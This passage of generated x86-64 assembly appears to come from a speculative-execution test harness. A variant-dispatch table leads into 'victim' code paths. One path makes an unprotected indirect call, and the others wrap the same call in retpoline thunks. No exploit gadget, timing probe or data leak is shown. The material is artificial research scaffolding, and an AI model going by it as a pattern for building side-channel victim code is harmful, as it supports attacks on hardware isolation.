	je	.Lvictim_win0_var993
	cmpl	$994, %eax
	je	.Lvictim_win0_var994
	cmpl	$995, %eax
	je	.Lvictim_win0_var995
	cmpl	$996, %eax
	je	.Lvictim_win0_var996
	cmpl	$997, %eax
	je	.Lvictim_win0_var997
	cmpl	$998, %eax
	je	.Lvictim_win0_var998
	cmpl	$999, %eax
	je	.Lvictim_win0_var999
	jmp	.Lvictim_win0_var0
## Variant 0
.Lvictim_win0_var0:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 1
.Lvictim_win0_var1:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000001
	jmp	.Lgg_retpol_after_000001
.Lgg_retpol_thunk_000001:
	callq	.Lgg_retpol_setup_000001
.Lgg_retpol_cap_000001:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000001
.Lgg_retpol_setup_000001:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000001:
	jmp	.Lvictim_win0_continue
## Variant 2
.Lvictim_win0_var2:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000002
	jmp	.Lgg_retpol_after_000002
.Lgg_retpol_thunk_000002:
	callq	.Lgg_retpol_setup_000002
.Lgg_retpol_cap_000002:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000002
.Lgg_retpol_setup_000002:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000002:
	jmp	.Lvictim_win0_continue
## Variant 3
.Lvictim_win0_var3:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000003
	jmp	.Lgg_retpol_after_000003
.Lgg_retpol_thunk_000003:
	callq	.Lgg_retpol_setup_000003
.Lgg_retpol_cap_000003:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000003
.Lgg_retpol_setup_000003:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000003:
	jmp	.Lvictim_win0_continue
## Variant 4
.Lvictim_win0_var4:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000004
	jmp	.Lgg_retpol_after_000004
.Lgg_retpol_thunk_000004:
	callq	.Lgg_retpol_setup_000004
.Lgg_retpol_cap_000004:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000004
.Lgg_retpol_setup_000004:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000004:
	jmp	.Lvictim_win0_continue
## Variant 5
.Lvictim_win0_var5:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000005
	jmp	.Lgg_retpol_after_000005
.Lgg_retpol_thunk_000005:
	callq	.Lgg_retpol_setup_000005
.Lgg_retpol_cap_000005:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000005
.Lgg_retpol_setup_000005:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000005:
	jmp	.Lvictim_win0_continue
## Variant 6
.Lvictim_win0_var6:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000006
	jmp	.Lgg_retpol_after_000006
.Lgg_retpol_thunk_000006:
	callq	.Lgg_retpol_setup_000006
.Lgg_retpol_cap_000006:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000006
.Lgg_retpol_setup_000006:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000006:
	jmp	.Lvictim_win0_continue
## Variant 7
.Lvictim_win0_var7:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000007
	jmp	.Lgg_retpol_after_000007
.Lgg_retpol_thunk_000007:
	callq	.Lgg_retpol_setup_000007
.Lgg_retpol_cap_000007:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000007
.Lgg_retpol_setup_000007:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000007:
	jmp	.Lvictim_win0_continue
## Variant 8
.Lvictim_win0_var8:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000008
	jmp	.Lgg_retpol_after_000008
.Lgg_retpol_thunk_000008:
	callq	.Lgg_retpol_setup_000008
.Lgg_retpol_cap_000008:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000008
.Lgg_retpol_setup_000008:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000008:
	jmp	.Lvictim_win0_continue
## Variant 9
.Lvictim_win0_var9:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000009
	jmp	.Lgg_retpol_after_000009
.Lgg_retpol_thunk_000009:
	callq	.Lgg_retpol_setup_000009
.Lgg_retpol_cap_000009:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000009
.Lgg_retpol_setup_000009:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000009:
	jmp	.Lvictim_win0_continue
## Variant 10
.Lvictim_win0_var10:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000010
	jmp	.Lgg_retpol_after_000010
.Lgg_retpol_thunk_000010:
	callq	.Lgg_retpol_setup_000010
.Lgg_retpol_cap_000010:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000010
.Lgg_retpol_setup_000010:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000010:
	jmp	.Lvictim_win0_continue
## Variant 11
.Lvictim_win0_var11:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000011
	jmp	.Lgg_retpol_after_000011
.Lgg_retpol_thunk_000011:
	callq	.Lgg_retpol_setup_000011
.Lgg_retpol_cap_000011:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000011
.Lgg_retpol_setup_000011:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000011:
	jmp	.Lvictim_win0_continue
## Variant 12
.Lvictim_win0_var12:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000012
	jmp	.Lgg_retpol_after_000012
.Lgg_retpol_thunk_000012:
	callq	.Lgg_retpol_setup_000012
.Lgg_retpol_cap_000012:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000012
.Lgg_retpol_setup_000012:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000012:
	jmp	.Lvictim_win0_continue
## Variant 13
.Lvictim_win0_var13:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000013
	jmp	.Lgg_retpol_after_000013
.Lgg_retpol_thunk_000013:
	callq	.Lgg_retpol_setup_000013
.Lgg_retpol_cap_000013:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000013
.Lgg_retpol_setup_000013:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000013:
	jmp	.Lvictim_win0_continue
## Variant 14
.Lvictim_win0_var14:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000014
	jmp	.Lgg_retpol_after_000014
.Lgg_retpol_thunk_000014:
	callq	.Lgg_retpol_setup_000014
.Lgg_retpol_cap_000014:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000014
.Lgg_retpol_setup_000014:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000014:
	jmp	.Lvictim_win0_continue
## Variant 15
.Lvictim_win0_var15:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000015
	jmp	.Lgg_retpol_after_000015
.Lgg_retpol_thunk_000015:
	callq	.Lgg_retpol_setup_000015
.Lgg_retpol_cap_000015:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000015
.Lgg_retpol_setup_000015:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000015:
	jmp	.Lvictim_win0_continue
## Variant 16
.Lvictim_win0_var16:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000016
	jmp	.Lgg_retpol_after_000016
.Lgg_retpol_thunk_000016:
	callq	.Lgg_retpol_setup_000016
.Lgg_retpol_cap_000016:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000016
.Lgg_retpol_setup_000016:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000016:
	jmp	.Lvictim_win0_continue
## Variant 17
.Lvictim_win0_var17:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000017
	jmp	.Lgg_retpol_after_000017
.Lgg_retpol_thunk_000017:
	callq	.Lgg_retpol_setup_000017
.Lgg_retpol_cap_000017:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000017
.Lgg_retpol_setup_000017:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000017:
	jmp	.Lvictim_win0_continue
## Variant 18
.Lvictim_win0_var18:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000018
	jmp	.Lgg_retpol_after_000018
.Lgg_retpol_thunk_000018:
	callq	.Lgg_retpol_setup_000018
.Lgg_retpol_cap_000018:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000018
.Lgg_retpol_setup_000018:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000018:
	jmp	.Lvictim_win0_continue
## Variant 19
.Lvictim_win0_var19:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000019
	jmp	.Lgg_retpol_after_000019
.Lgg_retpol_thunk_000019:
	callq	.Lgg_retpol_setup_000019
.Lgg_retpol_cap_000019:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000019
.Lgg_retpol_setup_000019:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000019:
	jmp	.Lvictim_win0_continue
## Variant 20
.Lvictim_win0_var20:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000020
	jmp	.Lgg_retpol_after_000020
.Lgg_retpol_thunk_000020:
	callq	.Lgg_retpol_setup_000020
.Lgg_retpol_cap_000020:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000020
.Lgg_retpol_setup_000020:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000020:
	jmp	.Lvictim_win0_continue
## Variant 21
.Lvictim_win0_var21:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000021
	jmp	.Lgg_retpol_after_000021
.Lgg_retpol_thunk_000021:
	callq	.Lgg_retpol_setup_000021
.Lgg_retpol_cap_000021:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000021
.Lgg_retpol_setup_000021:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000021:
	jmp	.Lvictim_win0_continue
## Variant 22
.Lvictim_win0_var22:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000022
	jmp	.Lgg_retpol_after_000022
.Lgg_retpol_thunk_000022:
	callq	.Lgg_retpol_setup_000022
.Lgg_retpol_cap_000022:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000022
.Lgg_retpol_setup_000022:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000022:
	jmp	.Lvictim_win0_continue
## Variant 23
.Lvictim_win0_var23:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000023
	jmp	.Lgg_retpol_after_000023
.Lgg_retpol_thunk_000023:
	callq	.Lgg_retpol_setup_000023
.Lgg_retpol_cap_000023:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000023
.Lgg_retpol_setup_000023:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000023:
	jmp	.Lvictim_win0_continue
## Variant 24
.Lvictim_win0_var24:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000024
	jmp	.Lgg_retpol_after_000024
.Lgg_retpol_thunk_000024:
	callq	.Lgg_retpol_setup_000024
.Lgg_retpol_cap_000024:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000024
.Lgg_retpol_setup_000024:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000024:
	jmp	.Lvictim_win0_continue
## Variant 25
.Lvictim_win0_var25:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000025
	jmp	.Lgg_retpol_after_000025
.Lgg_retpol_thunk_000025:
	callq	.Lgg_retpol_setup_000025
.Lgg_retpol_cap_000025:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000025
.Lgg_retpol_setup_000025:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000025:
	jmp	.Lvictim_win0_continue
## Variant 26
.Lvictim_win0_var26:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000026
	jmp	.Lgg_retpol_after_000026
.Lgg_retpol_thunk_000026:
	callq	.Lgg_retpol_setup_000026
.Lgg_retpol_cap_000026:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000026
.Lgg_retpol_setup_000026:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000026:
	jmp	.Lvictim_win0_continue
## Variant 27
.Lvictim_win0_var27:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000027
	jmp	.Lgg_retpol_after_000027
.Lgg_retpol_thunk_000027:
	callq	.Lgg_retpol_setup_000027
.Lgg_retpol_cap_000027:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000027
.Lgg_retpol_setup_000027:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000027:
	jmp	.Lvictim_win0_continue
## Variant 28
.Lvictim_win0_var28:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000028
	jmp	.Lgg_retpol_after_000028
.Lgg_retpol_thunk_000028:
	callq	.Lgg_retpol_setup_000028
.Lgg_retpol_cap_000028:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000028
.Lgg_retpol_setup_000028:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000028:
	jmp	.Lvictim_win0_continue
## Variant 29
.Lvictim_win0_var29:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000029
	jmp	.Lgg_retpol_after_000029
.Lgg_retpol_thunk_000029:
	callq	.Lgg_retpol_setup_000029
.Lgg_retpol_cap_000029:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000029
.Lgg_retpol_setup_000029:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000029:
	jmp	.Lvictim_win0_continue
## Variant 30
.Lvictim_win0_var30:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000030
	jmp	.Lgg_retpol_after_000030
.Lgg_retpol_thunk_000030:
	callq	.Lgg_retpol_setup_000030
.Lgg_retpol_cap_000030:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000030
.Lgg_retpol_setup_000030:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000030:
	jmp	.Lvictim_win0_continue
## Variant 31
.Lvictim_win0_var31:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000031
	jmp	.Lgg_retpol_after_000031
.Lgg_retpol_thunk_000031:
	callq	.Lgg_retpol_setup_000031
.Lgg_retpol_cap_000031:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000031
.Lgg_retpol_setup_000031:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000031:
	jmp	.Lvictim_win0_continue
## Variant 32
.Lvictim_win0_var32:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000032
	jmp	.Lgg_retpol_after_000032
.Lgg_retpol_thunk_000032:
	callq	.Lgg_retpol_setup_000032
.Lgg_retpol_cap_000032:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000032
.Lgg_retpol_setup_000032:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000032:
	jmp	.Lvictim_win0_continue
## Variant 33
.Lvictim_win0_var33:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000033
	jmp	.Lgg_retpol_after_000033
.Lgg_retpol_thunk_000033:
	callq	.Lgg_retpol_setup_000033
.Lgg_retpol_cap_000033:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000033
.Lgg_retpol_setup_000033:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000033:
	jmp	.Lvictim_win0_continue
## Variant 34
.Lvictim_win0_var34:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000034
	jmp	.Lgg_retpol_after_000034
.Lgg_retpol_thunk_000034:
	callq	.Lgg_retpol_setup_000034
.Lgg_retpol_cap_000034:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000034
.Lgg_retpol_setup_000034:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000034:
	jmp	.Lvictim_win0_continue
## Variant 35
.Lvictim_win0_var35:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000035
	jmp	.Lgg_retpol_after_000035
.Lgg_retpol_thunk_000035:
	callq	.Lgg_retpol_setup_000035
.Lgg_retpol_cap_000035:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000035
.Lgg_retpol_setup_000035:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000035:
	jmp	.Lvictim_win0_continue
## Variant 36
.Lvictim_win0_var36:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000036
	jmp	.Lgg_retpol_after_000036
.Lgg_retpol_thunk_000036:
	callq	.Lgg_retpol_setup_000036
.Lgg_retpol_cap_000036:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000036
.Lgg_retpol_setup_000036:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000036:
	jmp	.Lvictim_win0_continue
## Variant 37
.Lvictim_win0_var37:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000037
	jmp	.Lgg_retpol_after_000037
.Lgg_retpol_thunk_000037:
	callq	.Lgg_retpol_setup_000037
.Lgg_retpol_cap_000037:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000037
.Lgg_retpol_setup_000037:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000037:
	jmp	.Lvictim_win0_continue
## Variant 38
.Lvictim_win0_var38:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000038
	jmp	.Lgg_retpol_after_000038
.Lgg_retpol_thunk_000038:
	callq	.Lgg_retpol_setup_000038
.Lgg_retpol_cap_000038:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000038
.Lgg_retpol_setup_000038:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000038:
	jmp	.Lvictim_win0_continue
## Variant 39
.Lvictim_win0_var39:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000039
	jmp	.Lgg_retpol_after_000039
.Lgg_retpol_thunk_000039:
	callq	.Lgg_retpol_setup_000039
.Lgg_retpol_cap_000039:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000039
.Lgg_retpol_setup_000039:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000039:
	jmp	.Lvictim_win0_continue
## Variant 40
.Lvictim_win0_var40:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000040
	jmp	.Lgg_retpol_after_000040
.Lgg_retpol_thunk_000040:
	callq	.Lgg_retpol_setup_000040
.Lgg_retpol_cap_000040:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000040
.Lgg_retpol_setup_000040:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000040:
	jmp	.Lvictim_win0_continue
## Variant 41
.Lvictim_win0_var41:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000041
	jmp	.Lgg_retpol_after_000041
.Lgg_retpol_thunk_000041:
	callq	.Lgg_retpol_setup_000041
.Lgg_retpol_cap_000041:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000041
.Lgg_retpol_setup_000041:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000041:
	jmp	.Lvictim_win0_continue
## Variant 42
.Lvictim_win0_var42:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000042
	jmp	.Lgg_retpol_after_000042
.Lgg_retpol_thunk_000042:
	callq	.Lgg_retpol_setup_000042
.Lgg_retpol_cap_000042:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000042
.Lgg_retpol_setup_000042:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000042:
	jmp	.Lvictim_win0_continue
## Variant 43
.Lvictim_win0_var43:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000043
	jmp	.Lgg_retpol_after_000043
.Lgg_retpol_thunk_000043:
	callq	.Lgg_retpol_setup_000043
.Lgg_retpol_cap_000043:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000043
.Lgg_retpol_setup_000043:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000043:
	jmp	.Lvictim_win0_continue
## Variant 44
.Lvictim_win0_var44:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000044
	jmp	.Lgg_retpol_after_000044
.Lgg_retpol_thunk_000044:
	callq	.Lgg_retpol_setup_000044
.Lgg_retpol_cap_000044:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000044
.Lgg_retpol_setup_000044:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000044:
	jmp	.Lvictim_win0_continue
## Variant 45
.Lvictim_win0_var45:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000045
	jmp	.Lgg_retpol_after_000045
.Lgg_retpol_thunk_000045:
	callq	.Lgg_retpol_setup_000045
.Lgg_retpol_cap_000045:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000045
.Lgg_retpol_setup_000045:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000045:
	jmp	.Lvictim_win0_continue
## Variant 46
.Lvictim_win0_var46:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000046
	jmp	.Lgg_retpol_after_000046
.Lgg_retpol_thunk_000046:
	callq	.Lgg_retpol_setup_000046
.Lgg_retpol_cap_000046:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000046
.Lgg_retpol_setup_000046:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000046:
	jmp	.Lvictim_win0_continue
## Variant 47
.Lvictim_win0_var47:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000047
	jmp	.Lgg_retpol_after_000047
.Lgg_retpol_thunk_000047:
	callq	.Lgg_retpol_setup_000047
.Lgg_retpol_cap_000047:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000047
.Lgg_retpol_setup_000047:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000047:
	jmp	.Lvictim_win0_continue
## Variant 48
.Lvictim_win0_var48:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000048
	jmp	.Lgg_retpol_after_000048
.Lgg_retpol_thunk_000048:
	callq	.Lgg_retpol_setup_000048
.Lgg_retpol_cap_000048:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000048
.Lgg_retpol_setup_000048:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000048:
	jmp	.Lvictim_win0_continue
## Variant 49
.Lvictim_win0_var49:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000049
	jmp	.Lgg_retpol_after_000049
.Lgg_retpol_thunk_000049:
	callq	.Lgg_retpol_setup_000049
.Lgg_retpol_cap_000049:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000049
.Lgg_retpol_setup_000049:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000049:
	jmp	.Lvictim_win0_continue
## Variant 50
.Lvictim_win0_var50:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000050
	jmp	.Lgg_retpol_after_000050
.Lgg_retpol_thunk_000050:
	callq	.Lgg_retpol_setup_000050
.Lgg_retpol_cap_000050:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000050
.Lgg_retpol_setup_000050:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000050:
	jmp	.Lvictim_win0_continue
## Variant 51
.Lvictim_win0_var51:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000051
	jmp	.Lgg_retpol_after_000051
.Lgg_retpol_thunk_000051:
	callq	.Lgg_retpol_setup_000051
.Lgg_retpol_cap_000051:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000051
.Lgg_retpol_setup_000051:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000051:
	jmp	.Lvictim_win0_continue
## Variant 52
.Lvictim_win0_var52:
	popq	%rax
